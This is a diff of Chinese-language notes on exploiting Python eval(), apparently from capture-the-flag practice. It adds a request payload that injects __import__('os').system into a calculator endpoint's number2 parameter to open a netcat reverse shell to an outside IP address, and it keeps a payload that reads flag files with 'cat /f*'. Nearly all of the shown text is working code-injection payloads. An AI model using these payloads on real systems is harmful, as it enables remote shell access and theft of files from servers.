@@ -7,10 +7,17 @@
 
 
 
-## **eval()函数读文件**
+## **eval()函数利用**
+python报错后显示了代码：eval(a + operator + b)
+```
+拼接传参b
+/_calculate?number1=1&operator=-&number2=1,__import__ ('os').system(' nc 120.46.41.173 9023 -e /bin/sh')
+```
+
 ```
 eval(__import__('os').popen('cat /f*').read());
 ```
+
 
 ^
 ## **subprocess运行外部命令**
